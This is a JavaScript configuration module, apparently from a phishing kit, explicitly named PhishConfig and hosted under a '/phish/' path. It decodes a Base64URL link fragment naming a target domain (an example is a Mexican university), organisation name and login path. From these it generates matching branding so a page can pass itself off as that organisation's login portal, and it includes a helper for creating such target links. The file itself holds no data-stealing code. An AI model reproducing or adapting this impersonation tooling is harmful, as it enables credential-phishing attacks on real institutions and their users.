/* ============================================================
   config.js — URL decoding & target-site configuration
   ============================================================
   URL format:  https://nagusamecs.github.io/phish/#<base64url>
   The hash is a Base64URL-encoded JSON payload:
     { "d": "asf.edu.mx", "n": "ASF Portal" }
   Minimal form (just domain):
     base64url("asf.edu.mx")
   ============================================================ */

const PhishConfig = (() => {

  /* ---------- Base64-URL helpers ---------- */
  function b64urlEncode(str) {
    return btoa(unescape(encodeURIComponent(str)))
      .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  }

  function b64urlDecode(b64) {
    let s = b64.replace(/-/g, '+').replace(/_/g, '/');
    while (s.length % 4) s += '=';
    try {
      return decodeURIComponent(escape(atob(s)));
    } catch {
      return null;
    }
  }

  /* ---------- Parse hash ---------- */
  function parseHash() {
    const raw = location.hash.slice(1); // strip leading '#'
    if (!raw) return null;

    const decoded = b64urlDecode(raw);
    if (!decoded) return null;

    // Try JSON first
    try {
      const obj = JSON.parse(decoded);
      return {
        domain:  obj.d || obj.domain || 'example.com',
        orgName: obj.n || obj.name   || null,
        path:    obj.p || obj.path   || '/login',
      };
    } catch {
      // Plain string — treat as domain
      return {
        domain:  decoded.trim(),
        orgName: null,
        path:    '/login',
      };
    }
  }

  /* ---------- Derive branding from domain ---------- */
  function deriveBranding(cfg) {
    const d = cfg.domain.toLowerCase();
    const parts = d.split('.');
    const stem  = parts.length >= 2 ? parts[parts.length - 2] : parts[0];

    // Friendly name fallback
    if (!cfg.orgName) {
      cfg.orgName = stem.charAt(0).toUpperCase() + stem.slice(1);
    }

    // Generate a deterministic brand colour from the domain string
    let hash = 0;
    for (let i = 0; i < d.length; i++) hash = d.charCodeAt(i) + ((hash << 5) - hash);
    const hue = Math.abs(hash) % 360;
    cfg.brandColor = `hsl(${hue}, 55%, 48%)`;

    // Placeholder logo (first letter)
    cfg.logoLetter = cfg.orgName.charAt(0).toUpperCase();

    return cfg;
  }

  /* ---------- Public ---------- */
  function get() {
    const cfg = parseHash();
    if (!cfg) return null;
    return deriveBranding(cfg);
  }

  /* Convenience: generate a hash for a given domain (for link creation) */
  function generateHash(domain, orgName, path) {
    if (orgName || path) {
      const obj = { d: domain };
      if (orgName) obj.n = orgName;
      if (path)    obj.p = path;
      return b64urlEncode(JSON.stringify(obj));
    }
    return b64urlEncode(domain);
  }

  return { get, generateHash, b64urlEncode, b64urlDecode };
})();
